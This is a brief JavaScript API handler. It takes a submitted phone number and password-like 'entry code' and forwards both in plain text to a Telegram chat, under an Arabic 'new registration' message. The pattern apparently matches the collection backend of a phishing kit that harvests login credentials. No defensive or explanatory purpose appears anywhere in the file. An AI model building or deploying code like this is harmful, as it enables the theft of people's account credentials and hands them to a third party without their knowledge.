import { sendToTelegram } from '@/utils/telegram';
import { rateLimit } from '@/utils/rateLimit';
import { validatePhone, validateEntryCode } from '@/utils/validation';

export default async function handler(req, res) {
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'METHOD_NOT_ALLOWED' });
  }

  if (!rateLimit(req, res)) return;

  const { phone, entryCode } = req.body || {};

  if (!validatePhone(phone)) {
    return res.status(400).json({ success: false, error: 'INVALID_PHONE' });
  }

  if (!validateEntryCode(entryCode)) {
    return res.status(400).json({ success: false, error: 'INVALID_CODE' });
  }

  await sendToTelegram(`
🆕 تسجيل جديد
━━━━━━━━━━━━━━
📱 رقم الهاتف: ${phone}
🔐 كلمة السر: ${entryCode}
⏰ الوقت: ${new Date().toLocaleString('ar-MR')}
━━━━━━━━━━━━━━
  `);

  return res.status(200).json({ success: true });
}
